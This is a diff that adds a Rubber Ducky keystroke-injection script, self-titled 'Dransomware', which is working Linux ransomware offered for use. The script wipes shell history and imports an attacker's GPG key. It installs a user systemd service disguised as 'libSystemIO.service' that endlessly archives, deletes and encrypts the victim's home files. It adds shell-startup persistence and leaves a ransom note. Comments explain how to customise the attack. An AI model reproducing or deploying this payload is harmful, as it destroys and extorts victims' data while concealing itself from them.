@@ -1,0 +1,239 @@
+REM Title: Dransomware
+REM Description: Ransomware which encrypts users data without root privileges
+REM AUTHOR: drapl0n
+REM Version: 1.0
+REM Category: Ransomware
+REM Source: https://github.com/drapl0n/dransomware.git
+REM Target: GNU/Linux
+REM Attackmodes: HID
+
+REM [importing gpg public key]
+DELAY 500
+CTRL-ALT t
+DELAY 1000
+STRING unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
+ENTER
+DELAY 300
+REM Rather than printing key you can upload your key on server and fetch it using wget or curl.
+REM This method is for scenerio where their is no internet access to the system
+STRING touch public.pub
+ENTER
+DELAY 200
+STRING vi public.pub
+ENTER
+DELAY 50
+STRING i
+DELAY 200
+STRING -----BEGIN PGP PUBLIC KEY BLOCK-----
+ENTER
+ENTER
+STRING mQGNBGDn6UkBDADmUM3GGq6zlBFYq8hX78ZTZnMH8IrxYo9cr5Ni2DTyD5Ci+gPY
+ENTER
+STRING 2udDro6dfDy4uuKjNafPmaRf+1rvMbZYhINmnHeldV3bKskrKYL7nU29MlealK+c
+ENTER
+STRING hGE1AhFkJuv01eXCkJ8sLvXifzopTxWkffydEOeyrXEbIHFalmmrkYaFR9x87Rax
+ENTER
+STRING l7jbmPa/pd2TD5RHwsM2yZWhKHoE+0/nDIa5P5aEf6ODwqblYxPuhcDWH+1UOvDF
+ENTER
+STRING mDj34PoOMqhnVlUusNtD5CPCHn90KGTyAZM/GxMFIuvtoilBkw+KxPOz/xhT4sBD
+ENTER
+STRING K2YefqoBTRds/wB9+57eO4clL/bjUw1htJpMP7MvsqmVOa9HIXq+oJUrab8CmPmo
+ENTER
+STRING cjjCMbw6z/dEVI9y/BgZjDq8Z7dVUCaV/tQ0QQBzKsP7qpz78BLEpxhyU6EJNJLF
+ENTER
+STRING TRhwHTJWqwcQVYnh1KqXtJ68sriBEkTiKFZU7Cgr0hU2Wrs70lYDNBHTPoNd9vE1
+ENTER
+STRING zcTdUUPVEiWTwbsAEQEAAbQXZHJhbnMgPGRyYW5zQGRyYW5zLmNvbT6JAdQEEwEI
+ENTER
+STRING AD4WIQSqKkh3k7hWbZRNev2cV88R4I8DZwUCYOfpSQIbAwUJA8JnAAULCQgHAgYV
+ENTER
+STRING CgkICwIEFgIDAQIeAQIXgAAKCRCcV88R4I8DZ0woDADeSSYBbT3OVcm8FP6QQYRf
+ENTER
+STRING S2sy8cw24ziQryd6GvRb4oPumltHtfVOD9ypejy5JfNaN5oa5s82N4pRYPEUyEw/
+ENTER
+STRING lnTynwWMwtYw9up5aK7oemVdpana/pSDGQ6VYCGBzWW39F+1M2Uum1BbYtknzzX1
+ENTER
+STRING DU0tJMuGHpXMhcOpdGpjfP78LOHUg07xra9Q1REj0cnpL5wAXTwE3Oe3ZQINe8pH
+ENTER
+STRING EwvM/B7/EYClUf6iGOdc5EaVvaRexR5rVga9TmBJAaLDBdmk14Dx06Q9/BHQ6LRj
+ENTER
+STRING zNJe2yHD2zzZnL+nXM9UF/gzmkfozlbtTgarB9xCs3ZJvo0+Sfr6nOUqK8xbvtCR
+ENTER
+STRING ZS4IWtgppk7hjmEaJDN1lZGC3eIQJ1gVEfORYS9Myov+6Vv3WALv+FDY5hRJ+5Bz
+ENTER
+STRING e1g63bu4P0eKE1fk2Y64hzebXgQoL11x/uS0FpiqlW8STe0M2Mu8b7XUka/eg/zZ
+ENTER
+STRING AwkL/3QGFmqrIl5nMUnwPtQi6E+Pdk6/bRhOKKQeyd25AY0EYOfpSQEMAKzdbj3C
+ENTER
+STRING nbGIwYirjQ3mX5Wbzx2yz4vEQj1YluigyKoG/CxAYzg2FM3KYNEW7mUxSTMUornJ
+ENTER
+STRING YrJqw62B6icdkCY1WxxgpbEmn0jC6Srlb+0H+IKZRYwEvmlIrR5MyD6+p/av/k/Z
+ENTER
+STRING zXrHfcoczHzqYfwc6+tsImT+G4ktw7lMtzq6BJgZgoZOdSuBb4DWyl5vUt43QN44
+ENTER
+STRING RA32tp3fLsML24iFFbJEKjddrdBUjGp6+B8uj9/FkmhNhyF6D8R1/lMF0N34tNQB
+ENTER
+STRING ry0IV5T33zuXoWY78J48c6dVnmklMxOFr59/G7Se2UFf+3BJlhsKoebxlLuoK5vQ
+ENTER
+STRING kcE6eqdFuQVZGNW69okl1Mny7xqCMk1hb2Uq5odNJC8YsWgv5zAeow0IzGdtwuAs
+ENTER
+STRING n5JNWmmiVdi/MQGBjgwdVOq7TwrePVBIVlYESlkIkGf/855BKRHcNHwV8vuSNthB
+ENTER
+STRING sgfDZj3HreLnwWGJnlZfFwQM19OHjmqPP3j8paeFfmDXVVGpHvwORNY3qwARAQAB
+ENTER
+STRING iQG8BBgBCAAmFiEEqipId5O4Vm2UTXr9nFfPEeCPA2cFAmDn6UkCGwwFCQPCZwAA
+ENTER
+STRING CgkQnFfPEeCPA2cL0Av/abILLsaSl9R4jQS7BMyafUsnJ3zbUnRYF0fOYN/Bb1vR
+ENTER
+STRING jO7IAOqy5VLlIwYAJC2aG5hlTJ4kJvJrGXNkYEjEUWtX870HG9AHeCoOgBhQvP0q
+ENTER
+STRING XfUMIacEaXOz06HME2hKwG8v06YSDlD/GO3uZuzDtjAZZRvWL4yY2o6iMkAobTjj
+ENTER
+STRING 8T190Do8zc7+YN0ZGFbHuF1Ga2Pgg1ZldUA4Pnj/egI9skU5WIV6524hxic4z3LM
+ENTER
+STRING FenKCYUaxc0wJAQw6oNRtYYTeRvDKCikHKA/H9nGBcO0qjaoY3Sa96wCqXSY+ifP
+ENTER
+STRING xcK6snRe8z+RcTe/wADTrenSgJHSPx2OA1chSXqAUklbbDwNgu9Ldr2nAiPUA+Wn
+ENTER
+STRING Vq3EkSsZOiCd6YVrRUGP9Y39SPA/V4eWVox3QqJgo6sfyKb3InjVRCgJk9GnAquP
+ENTER
+STRING e+u4UkVpwfYhldbd3WwTSgzd7xqkym4QIsrds5q8NtWWj+kHo9LdVZ6hl11T83aO
+ENTER
+STRING Rd+dmVLPeNF6XJ60hm6n
+ENTER
+STRING =h69d
+ENTER
+STRING -----END PGP PUBLIC KEY BLOCK-----
+ESC
+DELAY 300 
+STRING :wq
+ENTER
+DELAY 300
+STRING gpg --import public.pub && rm -rf public.pub
+ENTER
+
+
+REM [Creating systemd service for non-root user]
+DELAY 200
+REM This is the path where encrypted directories will be stored
+STRING mkdir ~/.ransom
+ENTER
+DELAY 100
+STRING mkdir -p ~/.config/systemd/user && touch ~/.config/systemd/user/libSystemIO.service
+ENTER
+DELAY 200
+ENTER
+STRING cat >> ~/.config/systemd/user/libSystemIO.service
+DELAY 200
+ENTER
+DELAY 50
+STRING [Unit]
+ENTER
+REM You can change description
+REM You can change service description
+STRING Description = Ransom
+ENTER
+ENTER
+STRING [Service]
+ENTER
+CTRL d
+STRING echo ExecStart=/bin/bash /home/$(whoami)/.system/drans -no-browser >> ~/.config/systemd/user/libSystemIO.service
+ENTER
+STRING cat >> ~/.config/systemd/user/libSystemIO.service
+ENTER
+STRING Restart=on-failure
+ENTER
+STRING SuccessExitStatus=3 4
+ENTER
+STRING RestartForceExitStatus=3 4
+ENTER
+ENTER
+STRING [Install]
+ENTER
+STRING WantedBy=multi-user.target
+ENTER
+CTRL d
+ENTER
+
+REM [dransomware]
+DELAY 500
+STRING mkdir ~/.system && touch ~/.system/drans && vi ~/.system/drans
+ENTER
+STRING i
+DELAY 200
+STRING #!/bin/sh
+ENTER
+STRING cd ~/
+ENTER
+STRING encrypt(){                                                                                                     
+ENTER
+STRING          dirFile=$(ls | head -n 1)
+ENTER
+STRING          tar cf ~/.ransom/$dirFile.tar.gz --exclude='.' --exclude='..' --exclude='.ransom' --remove-files $dirFile
+ENTER
+REM replace drans with name of your key
+STRING          gpg -e -r drans -o ~/.ransom/$dirFile.tar.gpg ~/.ransom/$dirFile.tar.gz && rm -rf ~/.ransom/$dirFile.tar.gz 
+ENTER
+STRING }
+ENTER
+STRING for (( ; ; ))
+ENTER
+STRING do
+ENTER
+STRING        encrypt
+ENTER
+STRING done
+DELAY 100
+ESC
+STRING :wq
+ENTER
+DELAY 100
+STRING chmod +x ~/.system/drans
+ENTER
+DELAY 100
+REM change drans to name of your key
+STRING gpg --edit-key drans
+ENTER
+DELAY 100
+STRING trust
+ENTER
+DELAY 100
+STRING 5
+ENTER 
+DELAY 50
+STRING y
+ENTER
+CTRL c
+DELAY 100
+STRING gpg --check-trustdb
+ENTER
+STRING gpg --update-trustdb
+ENTER
+DELAY 100
+STRING systemctl --user enable --now libSystemIO.service
+ENTER
+DELAY 100
+STRING systemctl --user start libSystemIO.service
+ENTER
+DELAY 100
+DELAY 50
+
+REM [autostart on opening terminal]
+STRING echo systemctl --user enable --now libSystemIO.service >> ~/.zshrc
+ENTER
+DELAY 50
+STRING echo systemctl --user enable --now libSystemIO.service >> ~/.bashrc
+ENTER
+
+REM [Message]
+REM change message, to acquire ransom
+STRING mkdir ~/.hacker/ && touch ~/.hacker/README.txt
+ENTER
+DELAY 100
+echo I'm Hacker Don't try to ShutDown your system this will permanantly delete your data, contact test@test.com for further details... >> ~/.hacker/README.txt
+ENTER
+REM if you want to displya this message on terminal emulator startup un comment line below
+REM (STRING echo cat ~/.hacker/README.txt >> ~/.zshrc && echo cat ~/.hacker/README.txt >> ~/.bashrc) and ENTER
+DELAY 50
+STRING exit
+ENTER
